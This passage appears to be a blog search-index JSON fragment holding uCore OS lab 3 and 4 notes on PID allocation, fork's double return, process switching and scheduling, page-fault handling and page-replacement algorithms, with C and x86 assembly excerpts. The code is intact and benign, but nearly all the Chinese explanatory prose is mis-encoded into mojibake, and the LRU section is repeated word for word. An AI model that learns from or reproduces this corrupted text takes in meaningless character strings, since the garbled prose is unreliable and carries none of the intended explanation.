\u003e= next_safe) { if (last_pid \u003e= MAX_PID) { last_pid = 1; } next_safe = MAX_PID; goto repeat; } } else if (proc-\u003epid \u003e last_pid \u0026\u0026 next_safe \u003e proc-\u003epid) { next_safe = proc-\u003epid; } } } return last_pid; } ç³»ç»Ÿç¬¬ä¸€æ¬¡è°ƒç”¨get_pidæ—¶ï¼Œnext_safe == last_pid == MAX_PIDï¼Œå½“last_pidè‡ªå¢åå¤§äºç­‰äºMAX_PIDï¼Œåˆ™å½“å‰å¯èƒ½æ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨ï¼Œæ‰€ä»¥å…ˆè®¾ç½®last_pidä¸º1ã€‚pidä¸º0çš„è¿›ç¨‹æ˜¯æˆ‘ä»¬æ‰‹åŠ¨åˆ›å»ºçš„ã€‚æ¥ç€éå†è¿›ç¨‹é“¾è¡¨ï¼Œå¦‚æœè¿™æ˜¯ç¬¬ä¸€æ­¤è°ƒç”¨ï¼Œå¾ªç¯è·³å‡ºåï¼Œlast_pid = 1 ~ next_safe = MAX_PIDï¼Œåˆ™ä¸‹ä¸€æ¬¡åªéœ€è¦åœ¨è¿™ä¸ªèŒƒå›´å¯»æ‰¾å³å¯ã€‚å¦‚æœlast_pidå°äºMAX_PIDå’Œnext_safeé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥è¿”å›ã€‚ å¦‚æœè¶…è¿‡äº†next_safeï¼Œåˆ™éœ€è¦éå†è¿›ç¨‹åˆ—è¡¨ï¼Œè‹¥å½“å‰è¿›ç¨‹åˆ—è¡¨ä¸­æœ‰PIDç­‰äºlast_pidçš„è¿›ç¨‹ï¼Œåˆ™è¦é‡æ–°è®¾ç½®last_pidçš„å€¼ã€‚è¿˜è¦åˆ¤æ–­æ˜¯å¦è¶…è¿‡äº†next_safeã€‚ æ€»ä¹‹å°±æ˜¯åœ¨å‡½æ•°ä¸­ç»´æŠ¤äº†last_pid ~ next_safeçš„åŒºé—´å‡å°‘æœç´¢èŒƒå›´ã€‚ ","date":"2021-12-13","objectID":"/ucore-lab-4/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#ç»ƒä¹ 2"},{"categories":["Pwning"],"content":"forkçš„ä¸¤æ¬¡è¿”å›åœ¨copy_threadä¸­ // copy_thread - setup the trapframe on the process's kernel stack top and // - setup the kernel entry point and stack of process static void copy_thread(struct proc_struct *proc, uintptr_t esp, struct trapframe *tf) { proc-\u003etf = (struct trapframe *)(proc-\u003ekstack + KSTACKSIZE) - 1; *(proc-\u003etf) = *tf; proc-\u003etf-\u003etf_regs.reg_eax = 0; proc-\u003etf-\u003etf_esp = esp; proc-\u003etf-\u003etf_eflags |= FL_IF; proc-\u003econtext.eip = (uintptr_t)forkret; proc-\u003econtext.esp = (uintptr_t)(proc-\u003etf); } å¯ä»¥çœ‹åˆ°æ–°çº¿ç¨‹çš„eipè¢«è®¾ç½®ä¸ºforkret // forkret -- the first kernel entry point of a new thread/process // NOTE: the addr of forkret is setted in copy_thread function // after switch_to, the current proc will execute here. static void forkret(void) { forkrets(current-\u003etf); } forkretsä»¥å½“å‰è¿›ç¨‹çš„tfä¸ºå‚æ•°æ‰§è¡Œä¸€ä¸‹ä»£ç ï¼š # return falls through to trapret... .globl __trapret __trapret: # restore registers from stack popal # restore %ds, %es, %fs and %gs popl %gs popl %fs popl %es popl %ds # get rid of the trap number and error code addl $0x8, %esp iret .globl forkrets forkrets: # set stack to this new process's trapframe movl 4(%esp), %esp jmp __trapret ä»tfæ¢å¤æ®µå¯„å­˜å™¨å’Œé€šç”¨å¯„å­˜å™¨çš„å€¼ï¼Œå¹¶è¿”å›ã€‚è€Œåœ¨copu_threadä¸­å°†eaxçš„å€¼è®¾ç½®ä¸ºäº†0ã€‚ æ‰€ä»¥ï¼Œçˆ¶è¿›ç¨‹çš„forké€šè¿‡do_forkè¿”å›æ–°åˆ›å»ºè¿›ç¨‹çš„PIDï¼Œè€Œå­è¿›ç¨‹è·³è½¬åˆ°forkretsé€šè¿‡current-\u003etfæ¢å¤å¯„å­˜å™¨çš„å€¼ï¼Œè¿”å›0ã€‚ç”±æ­¤ï¼Œå®ç°äº†ä¸€æ¬¡è°ƒç”¨è¿”å›ä¸¤ä¸ªä¸åŒçš„å€¼ã€‚ ","date":"2021-12-13","objectID":"/ucore-lab-4/:1:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#forkçš„ä¸¤æ¬¡è¿”å›"},{"categories":["Pwning"],"content":"ç»ƒä¹ 3ç†è§£ proc_run å‡½æ•°å’Œå®ƒè°ƒç”¨çš„å‡½æ•°å¦‚ä½•å®Œæˆè¿›ç¨‹åˆ‡æ¢çš„ // proc_run - make process \"proc\" running on cpu // NOTE: before call switch_to, should load base addr of \"proc\"'s new PDT void proc_run(struct proc_struct *proc) { if (proc != current) { bool intr_flag; struct proc_struct *prev = current, *next = proc; local_intr_save(intr_flag); { current = proc; load_esp0(next-\u003ekstack + KSTACKSIZE); lcr3(next-\u003ecr3); switch_to(\u0026(prev-\u003econtext), \u0026(next-\u003econtext)); } local_intr_restore(intr_flag); } } åœ¨swtich_toä¹‹å‰ï¼Œè®¾ç½®currentã€espå’Œé¡µè¡¨å¯„å­˜å™¨cr3ã€‚è¿™ä¸ªè°ƒåº¦è¿‡ç¨‹ä¸èƒ½è¢«æ‰“æ–­ã€‚ ä½¿ç”¨æ ¹æ®è¿›ç¨‹PCBä¸­çš„contextä¿å­˜ä¹‹å‰è¿›ç¨‹çš„ä¸Šä¸‹æ–‡ï¼Œæ¢å¤ä¸‹ä¸€ä¸ªè¿›ç¨‹çš„ä¸Šä¸‹æ–‡ã€‚ void schedule(void) { bool intr_flag; list_entry_t *le, *last; struct proc_struct *next = NULL; local_intr_save(intr_flag); { current-\u003eneed_resched = 0; last = (current == idleproc) ? \u0026proc_list : \u0026(current-\u003elist_link); le = last; do { if ((le = list_next(le)) != \u0026proc_list) { next = le2proc(le, list_link); if (next-\u003estate == PROC_RUNNABLE) { break; } } } while (le != last); if (next == NULL || next-\u003estate != PROC_RUNNABLE) { next = idleproc; } next-\u003eruns ++; if (next != current) { proc_run(next); } } local_intr_restore(intr_flag); } proc_runç”±scheduleè°ƒç”¨ã€‚å®ƒä»è¿›ç¨‹é“¾è¡¨ä¸­å–å‡ºä¸€ä¸ªå°±ç»ªæ€çš„è¿›ç¨‹è°ƒç”¨proc_runã€‚ åœ¨æœ¬å®éªŒçš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œåˆ›å»ºä¸”è¿è¡Œäº†å‡ ä¸ªå†…æ ¸çº¿ç¨‹ï¼Ÿ ä¸¤ä¸ªå†…æ ¸çº¿ç¨‹ï¼Œåˆ†åˆ«æ˜¯idleprocå’Œinitprocã€‚ idleprocè´Ÿè´£è¿›ç¨‹è°ƒåº¦ initprocæ˜¯ä¹‹åæ‰€æœ‰æ–°è¿›ç¨‹çš„ç¥–å…ˆ è¯­å¥local_intr_save(intr_flag);....local_intr_restore(intr_flag);åœ¨è¿™é‡Œæœ‰ä½•ä½œç”¨?è¯·è¯´æ˜ç†ç”±ã€‚ è¿™ä¸¤å¥ä»£ç çš„ä½œç”¨åˆ†åˆ«æ˜¯é˜»å¡ä¸­æ–­å’Œè§£é™¤ä¸­æ–­çš„é˜»å¡ã€‚ è¿™ä¸¤å¥çš„é…åˆï¼Œä½¿å¾—è¿™ä¸¤å¥ä»£ç ä¹‹é—´çš„ä»£ç å—å½¢æˆåŸå­æ“ä½œï¼Œå¯ä»¥ä½¿å¾—æŸäº›å…³é”®çš„ä»£ç ä¸ä¼šè¢«æ‰“æ–­ï¼Œä»è€Œé¿å…å¼•èµ·ä¸€äº›æœªé¢„æ–™åˆ°çš„é”™è¯¯ï¼Œé¿å…æ¡ä»¶ç«äº‰ã€‚ ä»¥è¿›ç¨‹åˆ‡æ¢ä¸ºä¾‹ï¼Œåœ¨proc_runä¸­ï¼Œå½“åˆšè®¾ç½®å¥½currentæŒ‡é’ˆä¸ºä¸‹ä¸€ä¸ªè¿›ç¨‹ï¼Œä½†è¿˜æœªå®Œå…¨å°†æ§åˆ¶æƒè½¬ç§»æ—¶ï¼Œå¦‚æœè¯¥è¿‡ç¨‹çªç„¶è¢«ä¸€ä¸ªä¸­æ–­æ‰€æ‰“æ–­ï¼Œåˆ™ä¸­æ–­å¤„ç†ä¾‹ç¨‹çš„æ‰§è¡Œå¯èƒ½ä¼šå¼•å‘å¼‚å¸¸ï¼Œå› ä¸ºcurrentæŒ‡é’ˆæŒ‡å‘çš„è¿›ç¨‹ä¸å®é™…ä½¿ç”¨çš„è¿›ç¨‹èµ„æºä¸ä¸€è‡´ã€‚ ","date":"2021-12-13","objectID":"/ucore-lab-4/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-4","uri":"/ucore-lab-4/#ç»ƒä¹ 3"},{"categories":["Pwning"],"content":"é€šè¿‡lab2çŸ¥è¯†çš„è®²è§£ï¼Œæˆ‘ä»¬å·²ç»å¯¹è™šæ‹Ÿå†…å­˜æœ‰äº†ä¸€ä¸ªåˆæ­¥è®¤è¯†ï¼Œ æœ‰äº†å†…å­˜åœ°å€è™šæ‹ŸåŒ–ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è®¾ç½®é¡µè¡¨é¡¹æ¥é™å®šè½¯ä»¶è¿è¡Œæ—¶çš„è®¿é—®ç©ºé—´ï¼Œç¡®ä¿è½¯ä»¶è¿è¡Œä¸è¶Šç•Œï¼Œå®Œæˆå†…å­˜è®¿é—®ä¿æŠ¤çš„åŠŸèƒ½ã€‚ é€šè¿‡å†…å­˜åœ°å€è™šæ‹ŸåŒ–ï¼Œå¯ä»¥ä½¿å¾—è½¯ä»¶åœ¨æ²¡æœ‰è®¿é—®æŸè™šæ‹Ÿå†…å­˜åœ°å€æ—¶ä¸åˆ†é…å…·ä½“çš„ç‰©ç†å†…å­˜ï¼Œè€Œåªæœ‰åœ¨å®é™…è®¿é—®æŸè™šæ‹Ÿå†…å­˜åœ°å€æ—¶ï¼Œæ“ä½œç³»ç»Ÿå†åŠ¨æ€åœ°åˆ†é…ç‰©ç†å†…å­˜ï¼Œå»ºç«‹è™šæ‹Ÿå†…å­˜åˆ°ç‰©ç†å†…å­˜çš„é¡µæ˜ å°„å…³ç³»ï¼Œè¿™ç§æŠ€æœ¯ç§°ä¸ºæŒ‰éœ€åˆ†é¡µï¼ˆdemand pagingï¼‰ã€‚ æŠŠä¸ç»å¸¸è®¿é—®çš„æ•°æ®æ‰€å çš„å†…å­˜ç©ºé—´ä¸´æ—¶å†™åˆ°ç¡¬ç›˜ä¸Šï¼Œè¿™æ ·å¯ä»¥è…¾å‡ºæ›´å¤šçš„ç©ºé—²å†…å­˜ç©ºé—´ç»™ç»å¸¸è®¿é—®çš„æ•°æ®ï¼›å½“CPUè®¿é—®åˆ°ä¸ç»å¸¸è®¿é—®çš„æ•°æ®æ—¶ï¼Œå†æŠŠè¿™äº›æ•°æ®ä»ç¡¬ç›˜è¯»å…¥åˆ°å†…å­˜ä¸­ï¼Œè¿™ç§æŠ€æœ¯ç§°ä¸ºé¡µæ¢å…¥æ¢å‡ºï¼ˆpageã€€swap in/outï¼‰ã€‚è¿™ç§å†…å­˜ç®¡ç†æŠ€æœ¯ç»™äº†ç¨‹åºå‘˜æ›´å¤§çš„å†…å­˜â€œç©ºé—´â€ï¼Œä»è€Œå¯ä»¥è®©æ›´å¤šçš„ç¨‹åºåœ¨å†…å­˜ä¸­å¹¶å‘è¿è¡Œã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼š è™šæ‹Ÿå†…å­˜å•å…ƒä¸ä¸€å®šæœ‰å®é™…çš„ç‰©ç†å†…å­˜å•å…ƒå¯¹åº”ï¼Œå³å®é™…çš„ç‰©ç†å†…å­˜å•å…ƒå¯èƒ½ä¸å­˜åœ¨ï¼› å¦‚æœè™šæ‹Ÿå†…å­˜å•å…ƒå¯¹åº”æœ‰å®é™…çš„ç‰©ç†å†…å­˜å•å…ƒï¼Œé‚£äºŒè€…çš„åœ°å€ä¸€èˆ¬æ˜¯ä¸ç›¸ç­‰çš„ï¼› é€šè¿‡æ“ä½œç³»ç»Ÿå®ç°çš„æŸç§å†…å­˜æ˜ å°„å¯å»ºç«‹è™šæ‹Ÿå†…å­˜ä¸ç‰©ç†å†…å­˜çš„å¯¹åº”å…³ç³»ï¼Œä½¿å¾—ç¨‹åºå‘˜æˆ–CPUè®¿é—®çš„è™šæ‹Ÿå†…å­˜åœ°å€ä¼šè‡ªåŠ¨è½¬æ¢ä¸ºä¸€ä¸ªç‰©ç†å†…å­˜åœ°å€ã€‚ ","date":"2021-12-01","objectID":"/ucore-lab-3/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#"},{"categories":["Pwning"],"content":"Page faultäº§ç”Ÿé¡µè®¿é—®å¼‚å¸¸çš„åŸå› ä¸»è¦æœ‰ï¼š ç›®æ ‡é¡µå¸§ä¸å­˜åœ¨ï¼ˆé¡µè¡¨é¡¹å…¨ä¸º0ï¼Œå³è¯¥çº¿æ€§åœ°å€ä¸ç‰©ç†åœ°å€å°šæœªå»ºç«‹æ˜ å°„æˆ–è€…å·²ç»æ’¤é”€)ï¼› ç›¸åº”çš„ç‰©ç†é¡µå¸§ä¸åœ¨å†…å­˜ä¸­ï¼ˆé¡µè¡¨é¡¹éç©ºï¼Œä½†Presentæ ‡å¿—ä½=0ï¼Œæ¯”å¦‚åœ¨swapåˆ†åŒºæˆ–ç£ç›˜æ–‡ä»¶ä¸Š)ï¼Œè¿™åœ¨æœ¬æ¬¡å®éªŒä¸­ä¼šå‡ºç°ï¼Œæˆ‘ä»¬å°†åœ¨ä¸‹é¢ä»‹ç»æ¢é¡µæœºåˆ¶å®ç°æ—¶è¿›ä¸€æ­¥è®²è§£å¦‚ä½•å¤„ç†ï¼› ä¸æ»¡è¶³è®¿é—®æƒé™(æ­¤æ—¶é¡µè¡¨é¡¹Pæ ‡å¿—=1ï¼Œä½†ä½æƒé™çš„ç¨‹åºè¯•å›¾è®¿é—®é«˜æƒé™çš„åœ°å€ç©ºé—´ï¼Œæˆ–è€…æœ‰ç¨‹åºè¯•å›¾å†™åªè¯»é¡µé¢). å½“å‡ºç°ä¸Šé¢æƒ…å†µä¹‹ä¸€ï¼Œé‚£ä¹ˆå°±ä¼šäº§ç”Ÿé¡µé¢page faultï¼ˆ#PFï¼‰å¼‚å¸¸ã€‚CPUä¼šæŠŠäº§ç”Ÿå¼‚å¸¸çš„çº¿æ€§åœ°å€å­˜å‚¨åœ¨CR2ä¸­ï¼Œå¹¶ä¸”æŠŠè¡¨ç¤ºé¡µè®¿é—®å¼‚å¸¸ç±»å‹çš„å€¼ï¼ˆç®€ç§°é¡µè®¿é—®å¼‚å¸¸é”™è¯¯ç ï¼ŒerrorCodeï¼‰ä¿å­˜åœ¨ä¸­æ–­æ ˆä¸­ã€‚ é¡µè®¿é—®å¼‚å¸¸é”™è¯¯ç æœ‰32ä½ã€‚ä½0ä¸ºï¼‘è¡¨ç¤ºå¯¹åº”ç‰©ç†é¡µä¸å­˜åœ¨ï¼›ä½ï¼‘ä¸ºï¼‘è¡¨ç¤ºå†™å¼‚å¸¸ï¼ˆæ¯”å¦‚å†™äº†åªè¯»é¡µï¼›ä½ï¼’ä¸ºï¼‘è¡¨ç¤ºè®¿é—®æƒé™å¼‚å¸¸ï¼ˆæ¯”å¦‚ç”¨æˆ·æ€ç¨‹åºè®¿é—®å†…æ ¸ç©ºé—´çš„æ•°æ®ï¼‰ CR2æ˜¯é¡µæ•…éšœçº¿æ€§åœ°å€å¯„å­˜å™¨ï¼Œä¿å­˜æœ€åä¸€æ¬¡å‡ºç°é¡µæ•…éšœçš„å…¨32ä½çº¿æ€§åœ°å€ã€‚CR2ç”¨äºå‘ç”Ÿé¡µå¼‚å¸¸æ—¶æŠ¥å‘Šå‡ºé”™ä¿¡æ¯ã€‚å½“å‘ç”Ÿé¡µå¼‚å¸¸æ—¶ï¼Œå¤„ç†å™¨æŠŠå¼•èµ·é¡µå¼‚å¸¸çš„çº¿æ€§åœ°å€ä¿å­˜åœ¨CR2ä¸­ã€‚æ“ä½œç³»ç»Ÿä¸­å¯¹åº”çš„ä¸­æ–­æœåŠ¡ä¾‹ç¨‹å¯ä»¥æ£€æŸ¥CR2çš„å†…å®¹ï¼Œä»è€ŒæŸ¥å‡ºçº¿æ€§åœ°å€ç©ºé—´ä¸­çš„å“ªä¸ªé¡µå¼•èµ·æœ¬æ¬¡å¼‚å¸¸ã€‚ ","date":"2021-12-01","objectID":"/ucore-lab-3/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#page-fault"},{"categories":["Pwning"],"content":"uCoreçš„å¤„ç†CPUåœ¨å½“å‰å†…æ ¸æ ˆä¿å­˜å½“å‰è¢«æ‰“æ–­çš„ç¨‹åºç°åœºï¼Œå³ä¾æ¬¡å‹å…¥å½“å‰è¢«æ‰“æ–­ç¨‹åºä½¿ç”¨çš„EFLAGSï¼ŒCSï¼ŒEIPï¼ŒerrorCodeï¼›ç”±äºé¡µè®¿é—®å¼‚å¸¸çš„ä¸­æ–­å·æ˜¯0xEï¼ŒCPUæŠŠå¼‚å¸¸ä¸­æ–­å·0xEå¯¹åº”çš„ä¸­æ–­æœåŠ¡ä¾‹ç¨‹çš„åœ°å€ï¼ˆvectors.Sä¸­çš„æ ‡å·vector14å¤„ï¼‰åŠ è½½åˆ°CSå’ŒEIPå¯„å­˜å™¨ä¸­ï¼Œå¼€å§‹æ‰§è¡Œä¸­æ–­æœåŠ¡ä¾‹ç¨‹ã€‚è¿™æ—¶ucoreå¼€å§‹å¤„ç†å¼‚å¸¸ä¸­æ–­ï¼Œé¦–å…ˆéœ€è¦ä¿å­˜ç¡¬ä»¶æ²¡æœ‰ä¿å­˜çš„å¯„å­˜å™¨ã€‚åœ¨vectors.Sä¸­çš„æ ‡å·vector14å¤„å…ˆæŠŠä¸­æ–­å·å‹å…¥å†…æ ¸æ ˆï¼Œç„¶åå†åœ¨trapentry.Sä¸­çš„æ ‡å·__alltrapså¤„æŠŠDSã€ESå’Œå…¶ä»–é€šç”¨å¯„å­˜å™¨éƒ½å‹æ ˆã€‚è‡ªæ­¤ï¼Œè¢«æ‰“æ–­çš„ç¨‹åºæ‰§è¡Œç°åœºï¼ˆcontextï¼‰è¢«ä¿å­˜åœ¨å†…æ ¸æ ˆä¸­ã€‚æ¥ä¸‹æ¥ï¼Œåœ¨trap.cçš„trapå‡½æ•°å¼€å§‹äº†ä¸­æ–­æœåŠ¡ä¾‹ç¨‹çš„å¤„ç†æµç¨‹ï¼Œå¤§è‡´è°ƒç”¨å…³ç³»ä¸ºï¼š trapâ€“\u003e trap_dispatchâ€“\u003epgfault_handlerâ€“\u003edo_pgfault ä¸‹é¢éœ€è¦å…·ä½“åˆ†æä¸€ä¸‹do_pgfaultå‡½æ•°ã€‚do_pgfaultçš„è°ƒç”¨å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š äº§ç”Ÿé¡µè®¿é—®å¼‚å¸¸åï¼ŒCPUæŠŠå¼•èµ·é¡µè®¿é—®å¼‚å¸¸çš„çº¿æ€§åœ°å€è£…åˆ°å¯„å­˜å™¨CR2ä¸­ï¼Œå¹¶ç»™å‡ºäº†å‡ºé”™ç errorCodeï¼Œè¯´æ˜äº†é¡µè®¿é—®å¼‚å¸¸çš„ç±»å‹ã€‚ucore OSä¼šæŠŠè¿™ä¸ªå€¼ä¿å­˜åœ¨struct trapframe ä¸­tf_erræˆå‘˜å˜é‡ä¸­ã€‚è€Œä¸­æ–­æœåŠ¡ä¾‹ç¨‹ä¼šè°ƒç”¨é¡µè®¿é—®å¼‚å¸¸å¤„ç†å‡½æ•°do_pgfaultè¿›è¡Œå…·ä½“å¤„ç†ã€‚è¿™é‡Œçš„é¡µè®¿é—®å¼‚å¸¸å¤„ç†æ˜¯å®ç°æŒ‰éœ€åˆ†é¡µã€é¡µæ¢å…¥æ¢å‡ºæœºåˆ¶çš„å…³é”®ä¹‹å¤„ã€‚ ucoreä¸­do_pgfaultå‡½æ•°æ˜¯å®Œæˆé¡µè®¿é—®å¼‚å¸¸å¤„ç†çš„ä¸»è¦å‡½æ•°ï¼Œå®ƒæ ¹æ®ä»CPUçš„æ§åˆ¶å¯„å­˜å™¨CR2ä¸­è·å–çš„é¡µè®¿é—®å¼‚å¸¸çš„ç‰©ç†åœ°å€ä»¥åŠæ ¹æ®errorCodeçš„é”™è¯¯ç±»å‹æ¥æŸ¥æ‰¾æ­¤åœ°å€æ˜¯å¦åœ¨æŸä¸ªVMAçš„åœ°å€èŒƒå›´å†…ä»¥åŠæ˜¯å¦æ»¡è¶³æ­£ç¡®çš„è¯»å†™æƒé™ï¼Œå¦‚æœåœ¨æ­¤èŒƒå›´å†…å¹¶ä¸”æƒé™ä¹Ÿæ­£ç¡®ï¼Œè¿™è®¤ä¸ºè¿™æ˜¯ä¸€æ¬¡åˆæ³•è®¿é—®ï¼Œä½†æ²¡æœ‰å»ºç«‹è™šå®å¯¹åº”å…³ç³»ã€‚æ‰€ä»¥éœ€è¦åˆ†é…ä¸€ä¸ªç©ºé—²çš„å†…å­˜é¡µï¼Œå¹¶ä¿®æ”¹é¡µè¡¨å®Œæˆè™šåœ°å€åˆ°ç‰©ç†åœ°å€çš„æ˜ å°„ï¼Œåˆ·æ–°TLBï¼Œç„¶åè°ƒç”¨iretä¸­æ–­ï¼Œè¿”å›åˆ°äº§ç”Ÿé¡µè®¿é—®å¼‚å¸¸çš„æŒ‡ä»¤å¤„é‡æ–°æ‰§è¡Œæ­¤æŒ‡ä»¤ã€‚å¦‚æœè¯¥è™šåœ°å€ä¸åœ¨æŸVMAèŒƒå›´å†…ï¼Œåˆ™è®¤ä¸ºæ˜¯ä¸€æ¬¡éæ³•è®¿é—®ã€‚ ","date":"2021-12-01","objectID":"/ucore-lab-3/:1:0","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#ucoreçš„å¤„ç†"},{"categories":["Pwning"],"content":"é¡µæ›¿æ¢","date":"2021-12-01","objectID":"/ucore-lab-3/:0:0","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#é¡µæ›¿æ¢"},{"categories":["Pwning"],"content":"å±€éƒ¨é¡µé¢ç½®æ¢ç®—æ³• ç½®æ¢é¡µé¢çš„é€‰æ‹©èŒƒå›´ä»…é™äºå½“å‰è¿›ç¨‹å ç”¨çš„ç‰©ç†é¡µé¢å†…. ","date":"2021-12-01","objectID":"/ucore-lab-3/:1:0","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#å±€éƒ¨é¡µé¢ç½®æ¢ç®—æ³•"},{"categories":["Pwning"],"content":"æœ€ä¼˜é¡µé¢ç½®æ¢ç®—æ³•æœ€ä½³(Optimal, OPT)ç½®æ¢ç®—æ³•æ‰€é€‰æ‹©çš„è¢«æ·˜æ±°é¡µé¢å°†æ˜¯ä»¥åæ°¸ä¸ä½¿ç”¨çš„ï¼Œæˆ–è€…æ˜¯åœ¨æœ€é•¿æ—¶é—´å†…ä¸å†è¢«è®¿é—®çš„é¡µé¢,è¿™æ ·å¯ä»¥ä¿è¯è·å¾—æœ€ä½çš„ç¼ºé¡µç‡ã€‚ä½†ç”±äºäººä»¬ç›®å‰æ— æ³•é¢„çŸ¥è¿›ç¨‹åœ¨å†…å­˜ä¸‹çš„è‹¥åƒé¡µé¢ä¸­å“ªä¸ªæ˜¯æœªæ¥æœ€é•¿æ—¶é—´å†…ä¸å†è¢«è®¿é—®çš„ï¼Œå› è€Œè¯¥ç®—æ³•æ— æ³•å®ç°ã€‚ å¯ç”¨ä½œå…¶ä»–ç®—æ³•çš„è¯„ä»·çš„ä¾æ®ï¼ˆåœ¨ä¸€ä¸ªæ¨¡æ‹Ÿå™¨ä¸Šè¿è¡ŒæŸä¸ªç¨‹åºï¼Œå¹¶è®°å½•æ¯ä¸€æ¬¡çš„é¡µé¢çš„è®¿é—®æƒ…å†µï¼Œåœ¨ç¬¬äºŒéè¿è¡Œæ—¶é—´å¯ä½¿ç”¨æœ€ä¼˜ç®—æ³•ï¼‰ ","date":"2021-12-01","objectID":"/ucore-lab-3/:1:1","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#æœ€ä¼˜é¡µé¢ç½®æ¢ç®—æ³•"},{"categories":["Pwning"],"content":"æœ€è¿‘æœ€å°‘ç”¨ç®—æ³•ï¼ˆLRUï¼‰ç®€ä»‹ æ€è·¯ï¼šé€‰æ‹©æœ€é•¿æ—¶é—´æ²¡æœ‰è¢«å¼•ç”¨çš„é¡µé¢è¿›è¡Œç½®æ¢ã€‚ å®ç°ï¼šç¼ºé¡µæ—¶ï¼Œè®¡ç®—å†…å­˜ä¸­æ¯ä¸ªé€»è¾‘é¡µé¢çš„ä¸Šä¸€ä¸ªè®¿é—®æ—¶é—´ï¼Œå¹¶é€‰æ‹©ä¸Šä¸€ä¸ªä½¿ç”¨åˆ°å½“å‰æ—¶é—´æœ€é•¿çš„é¡µé¢ã€‚ ç‰¹å¾ï¼šæœ€ä¼˜ç½®æ¢ç®—æ³•çš„ä¸€ç§è¿‘ä¼¼ã€‚ b. å…·ä½“å®ç° é¡µé¢é“¾è¡¨ ç³»ç»Ÿç»´æŠ¤ä¸€ä¸ªæŒ‰æœ€è¿‘ä¸€æ¬¡è®¿é—®æ—¶é—´æ’åºçš„é¡µé¢é“¾è¡¨ é“¾è¡¨é¦–èŠ‚ç‚¹æ˜¯æœ€è¿‘åˆšåˆšä½¿ç”¨è¿‡çš„é¡µé¢ é“¾è¡¨å°¾ç»“ç‚¹æ˜¯æœ€ä¹…æœªä½¿ç”¨çš„é¡µé¢ è®¿é—®å†…å­˜æ—¶ï¼Œæ‰¾åˆ°ç›¸åº”é¡µé¢å¹¶å°†å…¶ç§»è‡³é“¾è¡¨ä¹‹é¦– ç¼ºé¡µæ—¶ï¼Œç½®æ¢é“¾è¡¨å°¾ç»“ç‚¹çš„é¡µé¢ æ´»åŠ¨é¡µé¢æ ˆ è®¿é—®é¡µé¢æ—¶ï¼Œå°†æ­¤é¡µå·å‹å…¥æ ˆåº•ã€‚å¹¶å°†æ ˆå†…ç›¸åŒçš„é¡µå·æŠ½å‡º ç¼ºé¡µæ—¶ï¼Œç½®æ¢æ ˆåº•çš„é¡µé¢ã€‚ ä¸Šè¿°çš„ä¸¤ç§å®ç°éƒ½éœ€è¦ç»´æŠ¤ä»¥åŠéå†æœç´¢æŸä¸ªæ•°æ®ç»“æ„ï¼Œ åŒæ—¶LRUå¯¹äºè¿‡å»çš„è®¿é—®æƒ…å†µç»Ÿè®¡è¿‡äºç»†è‡´ï¼Œæ‰€ä»¥è¯¥æ–¹æ³•è¾ƒä¸ºå¤æ‚ã€‚ ","date":"2021-12-01","objectID":"/ucore-lab-3/:1:2","series":null,"tags":["Pwn"],"title":"uCore-lab-3","uri":"/ucore-lab-3/#æœ€è¿‘æœ€å°‘ç”¨ç®—æ³•lru"},{"categories":["Pwning"],"content":"æœ€è¿‘æœ€å°‘ç”¨ç®—æ³•ï¼ˆLRUï¼‰ç®€ä»‹ æ€è·¯ï¼šé€‰æ‹©æœ€é•¿æ—¶é—´æ²¡æœ‰è¢«å¼•ç”¨çš„é¡µé¢è¿›è¡Œç½®æ¢ã€‚ å®ç°ï¼šç¼ºé¡µæ—¶ï¼Œè®¡ç®—å†…å­˜ä¸­æ¯ä¸ªé€»è¾‘é¡µé¢çš„ä¸Šä¸€ä¸ªè®¿é—®æ—¶é—´ï¼Œå¹¶é€‰æ‹©ä¸Šä¸€ä¸ªä½¿ç”¨åˆ°å½“å‰æ—¶é—´æœ€é•¿çš„é¡µé¢ã€‚ ç‰¹å¾ï¼šæœ€ä¼˜ç½®æ¢ç®—æ³•çš„ä¸€ç§è¿‘ä¼¼ã€‚ b. å…·ä½“å®ç° é¡µé¢é“¾è¡¨ ç³»ç»Ÿç»´æŠ¤ä¸€ä¸ªæŒ‰æœ€è¿‘ä¸€æ¬¡è®¿é—®æ—¶é—´æ’åºçš„é¡µé¢é“¾è¡¨ é“¾è¡¨é¦–èŠ‚ç‚¹æ˜¯æœ€è¿‘åˆšåˆšä½¿ç”¨è¿‡çš„é¡µé¢ é“¾è¡¨å°¾ç»“ç‚¹æ˜¯æœ€ä¹…æœªä½¿ç”¨çš„é¡µé¢ è®¿é—®å†…å­˜æ—¶ï¼Œæ‰¾åˆ°ç›¸åº”é¡µé¢å¹¶å°†å…¶ç§»è‡³é“¾è¡¨ä¹‹é¦– ç¼ºé¡µæ—¶ï¼Œç½®æ¢é“¾è¡¨å°¾ç»“ç‚¹çš„é¡µé¢ æ´»åŠ¨é¡µé¢æ ˆ è®¿é—®é¡µé¢æ—¶ï¼Œå°†æ­¤é¡µå·å‹å…¥æ ˆåº•ã€‚å¹¶å°†æ ˆå†…ç›¸åŒçš„é¡µå·æŠ½å‡º ç¼ºé¡µæ—¶ï¼Œç½®æ¢æ ˆåº•çš„é¡µé¢ã€‚ ä¸Šè¿°çš„ä¸¤ç§å®ç°éƒ½éœ€è¦ç»´æŠ¤ä»¥åŠéå†æœç´¢æŸä¸ªæ•°æ®ç»“æ„ï¼Œ åŒæ—¶LRUå¯¹äºè¿‡å»çš„è®¿é—®æƒ…å†µç»Ÿè®¡è¿‡äºç»†è‡´ï¼Œæ‰€ä»¥è¯¥æ–¹æ³•è¾ƒä¸ºå¤æ‚ã€‚ 